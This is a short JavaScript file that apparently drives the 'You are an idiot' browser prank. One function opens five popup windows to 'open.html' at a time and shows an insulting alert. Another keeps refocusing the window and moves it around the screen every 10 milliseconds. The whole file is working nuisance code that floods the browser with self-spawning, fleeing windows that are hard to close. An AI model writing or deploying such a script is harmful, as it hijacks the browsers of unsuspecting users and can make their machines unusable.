
var xOff = 5;
var yOff = 5;
var xPos = 400;
var yPos = 100;
var armed = true;	
	
function openWindow(url){
    aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=noresizable=no,width=280,height=275,titlebar=no,alwaysRaised=yes');
}

function procreate(){
	    if(armed){
		openWindow('open.html');
        openWindow('open.html');
        openWindow('open.html');
        openWindow('open.html');
        openWindow('open.html');
        alert("You are an idiot");
		}
		}
function playBall() {
	    if(armed){
        window.focus();   
        xPos = xPos + xOff;
        yPos = yPos + yOff;
        if (xPos > screen.width-175){
        xOff = Math.ceil( 0 - 6 * Math.random()) * 5 - 10 ;
        window.focus();
        }
        if (xPos < 0){
        xOff = Math.ceil(7 * Math.random())  * 5 - 10 ;
        }
        if (yPos > screen.height-100){
        yOff = Math.ceil( 0 - 6 * Math.random())  * 5 - 10 ;
        }
        if (yPos < 0){
        yOff = Math.ceil( 7 * Math.random())  * 5 - 10  ;
        }
        window.moveTo(xPos,yPos);
		setTimeout('playBall()',10);
		}	
}